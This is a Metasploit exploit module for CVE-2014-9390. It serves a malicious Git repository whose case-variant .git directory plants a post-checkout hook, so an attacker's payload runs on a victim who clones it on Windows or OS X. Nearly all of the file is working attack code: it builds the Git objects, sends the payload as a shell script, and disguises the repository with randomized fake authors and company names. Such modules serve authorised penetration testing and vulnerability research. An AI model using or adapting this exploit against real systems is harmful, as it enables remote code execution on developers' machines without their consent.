##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Malicious Git HTTP Server For CVE-2014-9390',
      'Description' => %q(
        This module exploits CVE-2014-9390, which affects Git versions less
        than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 on operating systems which
        have case-insensitive file systems like Windows and OS X.  Because the
        file system is case-insensitive, sensitive files in the .git directory
        can be overwritten by other files which live in a server-side .git
        directory which only differs in case (for example, .giT).  This results
        in all manner of potential consequences, including remote code
        execution.
      ),
      'License' => MSF_LICENSE,
      'Author' => [
        'Jon Hart <jon_hart[at]rapid7.com>' # metasploit module
      ],
      'References'     =>
        [
          ['CVE', '2014-9390'],
          ['URL', 'http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html'],
          ['URL', 'https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/']
        ],
      'DisclosureDate' => 'Dec 18 2014',
      # TODO: correct all of this
      'Payload'        =>
        {
          'BadChars' => "\x00",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl bash'
            }
        },
      'Platform'	=> %w(osx win),
      'Targets'	=>
        [
          [
            'Automatic',
            {
              'Platform' => [ 'unix' ],
              'Arch'     => ARCH_CMD
            }
          ]
        ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('URIPATH', [true, 'The URI to use as the malicious Git instance', '/got.git'])
      ])
  end

  def setup
    # This builds a fake git repository using the knowledge from:
    # http://schacon.github.io/gitbook/7_how_git_stores_objects.html
    # http://schacon.github.io/gitbook/7_browsing_git_objects.html
    #
    # It creates a .giT/hooks/post-checkout file that contains a command to
    # execute.  Because the full path of this file will be considered identical
    # on case-insensitive filesystems and will be use in place of
    # .git/hooks/post-checkout and will subsequently execute commands of our
    # choosing upon cloning
    @file_paths = {}
    # build the post-update file blob
    full_cmd = "#!/bin/sh\n#{payload.encoded}"
    sha1, content = build_object('blob', full_cmd)
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build tree that points to the blob
    sha1, content = build_object('tree', "100755 post-checkout\0#{[sha1].pack('H*')}")
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the hooks directory in which post-update lives
    sha1, content = build_object('tree', "40000 hooks\0#{[sha1].pack('H*')}")
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the partially uppercased .git directory in
    # which hooks live
    variants = []
    %w(g G). each do |g|
      %w(i I).each do |i|
        %w(t T).each do |t|
          git = g + i + t
          variants << git unless git.chars.none? { |c| c == c.upcase }
        end
      end
    end
    git_dir = variants.sample
    sha1, content = build_object('tree', "40000 .#{git_dir}\0#{[sha1].pack('H*')}")
    vprint_status("Planting partially uppercased .git at .#{git_dir}")
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build the supposed commit that dropped this file
    # a random user and user name
    user = rand_text_alphanumeric(3 + rand(10)) + ' ' + rand_text_alphanumeric(3 + rand(10))
    user_name = user.downcase.gsub(/\s+/, '_')
    # random company
    company = (rand_text_alphanumeric(3 + rand(10)) + '.' + %w(com net org).sample).downcase
    # random commit and author time stamps
    tstamp = Time.now.to_i
    author_time = rand(tstamp)
    commit_time = rand(author_time)
    tz_off = rand(10)
    commit = "author #{user} <#{user_name}@#{company}> #{author_time} -0#{tz_off}00\n" \
             "committer #{user} <#{user_name}@#{company}> #{commit_time} -0#{tz_off}00\n" \
             "\n" \
             "Initial commit to open repository for #{company}!\n"
    if datastore['VERBOSE']
      vprint_status("Malicious commit is:")
      commit.each_line { |l| vprint_status(l.strip) }
    end
    commit_content = "tree #{sha1}\n#{commit}"
    sha1, content = build_object('commit', commit_content)
    @file_paths["/objects/#{get_path(sha1)}"] = content
    # build HEAD
    @file_paths['/HEAD'] = "ref: refs/heads/master\n"
    # lastly, build refs
    @file_paths['/info/refs'] = "#{sha1}\trefs/heads/master\n"
  end

  def build_object(type, content)
    header = "#{type} #{content.size}\0"
    store = header + content
    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
  end

  def get_path(sha1)
    sha1[0...2] + '/' + sha1[2..40]
  end

  def exploit
    super
  end

  def on_request_uri(cli, req)
    if user_agent = req.headers['User-Agent']
      if user_agent =~ /^git\//
        do_git(cli, req)
      elsif user_agent =~ /^mercurial\//
        do_mercurial(cli, req)
      else
        vprint_status("Ignoring unaffected User-Agent for: #{req}")
        send_not_found(cli)
        return
      end
    else
      vprint_status("Ignoring User-Agent-less request for: #{req}")
      send_not_found(cli)
      return
    end
  end

  def do_git(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    req_file = URI.parse(req.uri).path.gsub(/^#{datastore['URIPATH']}/, '')
    if @file_paths.key?(req_file)
      vprint_status("Sending #{req_file}")
      send_response(cli, @file_paths[req_file])
    else
      vprint_status("#{req_file} doesn't exist")
      send_not_found(cli)
    end
  end

  def do_mercurial(cli, req)
    # XXX: this does nothing right now beyond help me figure out the mercurial
    # HTTP protocol
    vprint_status(req)
    send_not_found(cli)
  end
end
